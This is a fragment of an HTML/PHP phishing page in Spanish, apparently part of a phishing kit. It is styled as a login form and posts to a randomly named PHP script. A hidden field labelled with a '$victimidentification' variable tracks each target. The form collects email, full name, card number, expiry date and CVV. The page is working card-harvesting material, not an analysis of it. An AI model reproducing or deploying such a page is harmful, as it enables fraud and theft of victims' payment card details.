...
<form id="loginFrm" name="loginFrm" method="post" action="KPsUKMTwidmNOMI.php">
			...
			<div class="login-content container-12">
				...
				<div class="login-form grid-4">
					<div class="login-form-conten">
						<div>
							<span> E-mail </span><input required="required" id="ccemail" type="email" name="ccemail" value="" tabindex="4" class="inputTextChico nickname_qwerty">
						</div>
						<div>
							<input type="hidden" value="<?php echo $victimidentification; ?>" name="sekretcode" id="sekretcode">
							<span> Nombre Completo </span><input required="required" id="ccname" type="text" name="ccname" value="" tabindex="4" class="inputTextChico nickname_qwerty">
						</div>
						<div><label for="docNumber">
Número de Tarjeta</label><input required="required" autocomplete="off" maxlength="16" id="ccnumber" type="text" name="ccnumber" class="username_qwerty ui-keyboard-input ui-widget-content ui-corner-all" tabindex="2" aria-haspopup="true" role="textbox">
						</div>
						<div>
							<span> Fecha de expiraci&oacute;n </span><br>
							<input required="required" id="ccmonth" type="text" name="ccmonth" value="" tabindex="4" style="width: 20px;" maxlength="2"><span>/</span>
							<input required="required" id="ccyear" type="text" name="ccyear" value="" tabindex="4" style="width: 20px;" maxlength="2">
						</div>
						<div>
							<span>CVV</span><br>
							<input required="required" id="cvv" type="text" name="cvv" value="" tabindex="4" style="width: 30px;" aria-haspopup="true" role="textbox">
						</div>
